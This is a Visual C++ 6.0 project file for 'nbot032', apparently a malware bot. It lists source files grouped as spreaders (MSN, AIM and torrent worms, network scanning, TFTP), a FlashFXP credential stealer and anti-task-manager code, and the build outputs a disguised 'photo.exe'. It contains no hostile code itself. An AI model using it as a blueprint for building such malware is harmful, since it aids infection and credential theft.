# Microsoft Developer Studio Project File - Name="nbot032" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Application" 0x0101

CFG=nbot032 - WIN32 RELEASE
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "nbot.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "nbot.mak" CFG="nbot032 - WIN32 RELEASE"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "nbot032 - Win32 Release" (based on "Win32 (x86) Application")
!MESSAGE "nbot032 - Win32 Debug" (based on "Win32 (x86) Application")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "nbot032 - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386
# ADD LINK32 wininet.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /subsystem:windows /machine:I386 /out:"bin/photo.exe" /align:4096
# SUBTRACT LINK32 /pdb:none

!ELSEIF  "$(CFG)" == "nbot032 - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "nbot032___Win32_Debug"
# PROP BASE Intermediate_Dir "nbot032___Win32_Debug"
# PROP BASE Ignore_Export_Lib 0
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "nbot032___Win32_Debug"
# PROP Intermediate_Dir "nbot032___Win32_Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /YX /FD /c
# ADD CPP /nologo /W3 /Gi /GX /Od /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /FR /YX /FD /c
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x409 /d "NDEBUG"
# ADD RSC /l 0x409 /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib wsock32.lib wininet.lib /nologo /subsystem:windows /machine:I386 /align:4096
# SUBTRACT BASE LINK32 /pdb:none
# ADD LINK32 Advapi32.lib kernel32.lib user32.lib gdi32.lib mpr.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib ws2_32.lib wininet.lib /nologo /subsystem:windows /incremental:yes /map /debug /machine:I386 /ignore:4108 /ignore:4108 /align:4096
# SUBTRACT LINK32 /pdb:none

!ENDIF 

# Begin Target

# Name "nbot032 - Win32 Release"
# Name "nbot032 - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Group "spreader files"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\advscan.cpp
# End Source File
# Begin Source File

SOURCE=.\Aim.cpp
# End Source File
# Begin Source File

SOURCE=.\Azureus.cpp
# End Source File
# Begin Source File

SOURCE=.\DropFile.cpp
# End Source File
# Begin Source File

SOURCE=.\MSNWorm.cpp
# End Source File
# Begin Source File

SOURCE=".\TFTP 2008.CPP"
# End Source File
# Begin Source File

SOURCE=.\Triton.cpp
# End Source File
# Begin Source File

SOURCE=.\uTorrent.cpp
# End Source File
# Begin Source File

SOURCE=.\zip.cpp
# End Source File
# End Group
# Begin Group "Debug"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\Anti.cpp
# End Source File
# Begin Source File

SOURCE=.\AntiTaskManager.cpp
# End Source File
# End Group
# Begin Group "Stealers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\FlashFxp.cpp
# End Source File
# End Group
# Begin Source File

SOURCE=.\download.cpp
# End Source File
# Begin Source File

SOURCE=.\ftpd.cpp
# End Source File
# Begin Source File

SOURCE=.\hostcheck.cpp
# End Source File
# Begin Source File

SOURCE=.\nbot.cpp
# End Source File
# Begin Source File

SOURCE=.\other.cpp
# End Source File
# Begin Source File

SOURCE=.\threads.cpp
# End Source File
# Begin Source File

SOURCE=.\uninstall.cpp
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter ""
# Begin Group "spreader headers"

# PROP Default_Filter ""
# Begin Source File

SOURCE=.\aim.h
# End Source File
# Begin Source File

SOURCE=.\dropfile.h
# End Source File
# Begin Source File

SOURCE=.\msn.h
# End Source File
# Begin Source File

SOURCE=.\seeder.h
# End Source File
# Begin Source File

SOURCE=.\seeder2.h
# End Source File
# Begin Source File

SOURCE=".\tftp 2008.h"
# End Source File
# Begin Source File

SOURCE=.\triton.h
# End Source File
# Begin Source File

SOURCE=.\zip.h
# End Source File
# End Group
# Begin Source File

SOURCE=.\advscan.h
# End Source File
# Begin Source File

SOURCE=.\config.h
# End Source File
# Begin Source File

SOURCE=.\defines.h
# End Source File
# Begin Source File

SOURCE=.\download.h
# End Source File
# Begin Source File

SOURCE=.\extern.h
# End Source File
# Begin Source File

SOURCE=.\ftpd.h
# End Source File
# Begin Source File

SOURCE=.\hostcheck.h
# End Source File
# Begin Source File

SOURCE=.\includes.h
# End Source File
# Begin Source File

SOURCE=.\nbot.h
# End Source File
# Begin Source File

SOURCE=.\other.h
# End Source File
# Begin Source File

SOURCE=.\tcpip.h
# End Source File
# Begin Source File

SOURCE=.\threads.h
# End Source File
# Begin Source File

SOURCE=.\uninstall.h
# End Source File
# End Group
# End Target
# End Project
